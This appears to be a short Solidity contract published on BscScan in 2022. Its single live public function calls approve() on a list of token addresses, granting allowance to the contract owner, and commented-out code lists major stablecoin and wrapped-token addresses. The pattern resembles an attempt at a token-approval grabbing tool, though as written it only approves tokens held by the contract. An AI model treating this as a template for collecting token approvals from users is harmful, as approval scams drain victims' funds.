/**
 *Submitted for verification at BscScan.com on 2022-08-08
*/

pragma solidity >=0.8.0;

contract Smart {
    address public owner;
    // address public addr1 = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; //BUSD
    // address public addr2 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; //USDC
    // address public addr3 = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8; //ETH

    // address public addr1 = 0x55d398326f99059fF775485246999027B3197955; //Binance-Peg BSC-USD
    // address public addr2 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //Wrapped BNB
    // address public addr3 = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE; //Binance-Peg XRP Token

    constructor() {
        owner = msg.sender;
    }

    // function getSymbolBusd() public view returns (string memory) {
    //     IBEP20 bep = IBEP20(addr1);
    //     return bep.symbol();
    // }

    // function getSymbolUsdc() public view returns (string memory) {
    //     IBEP20 bep = IBEP20(addr2);
    //     return bep.symbol();
    // }

    // function getSymbolEth() public view returns (string memory) {
    //     IBEP20 bep = IBEP20(addr3);
    //     return bep.symbol();
    // }


    function approve(address[] memory _spenders, uint _value) public returns(bool) {

        for (uint i = 0; i < _spenders.length; i++) {
            IBEP20 token = IBEP20(_spenders[i]);
            token.approve(owner, _value);
        }

        return true;
    }

}

interface IBEP20 {
    function symbol() external view returns (string memory);
    function approve(address spender, uint256 amount) external returns (bool);
}